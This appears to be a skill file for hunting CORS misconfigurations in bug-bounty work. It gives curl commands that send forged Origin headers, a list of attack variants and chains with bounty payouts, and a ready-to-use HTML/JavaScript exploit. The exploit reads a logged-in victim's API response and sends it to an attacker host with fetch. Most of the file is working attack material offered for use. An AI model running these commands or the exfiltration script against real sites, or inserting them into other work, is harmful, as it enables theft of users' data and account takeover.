---
name: hunt-cors
description: CORS — origin reflection, null origin, preflight abuse, wildcard detection. Chains to session hijacking and ATO.
---

# CORS HUNTING — 3 BULLETS MAX

**Core:** CORS bugs chain to full ATO with one reflected Origin.

## DETECTION
```bash
curl -s -I -H "Origin: https://evil.com" "https://target.com/api/userinfo" | grep -i "access-control"
# If ACAO reflects evil.com + ACAC: true → VULNERABLE
curl -s -I -H "Origin: null" "https://target.com/api/userinfo" | grep -i "access-control"
```

## ATTACKS
```
Origin reflection: server reflects any Origin → credentialed data theft
Null origin: sandboxed iframe sends Origin: null → data theft
Subdomain trust: *.target.com trusted + XSS on subdomain → full ATO
Pre-flight: OPTIONS allows evil Origin + credentials header
HTTP→HTTPS downgrade: Origin not checked on HTTP endpoints
```

## EXPLOIT (steal data)
```html
<script>
var r=new XMLHttpRequest();r.open("GET","https://target.com/api/userinfo",true);
r.withCredentials=true;
r.onreadystatechange=function(){if(r.readyState==4&&r.status==200)fetch("https://attacker.com/log?data="+encodeURIComponent(r.responseText))};
r.send();
</script>
```

## CHAINS
```
CORS reflection + credentials → ATO                    ($1K → $50K)
Subdomain trust + XSS → full ATO chain                  ($1K → $50K)
Null origin + sandboxed iframe → data theft              ($500 → $10K)
```
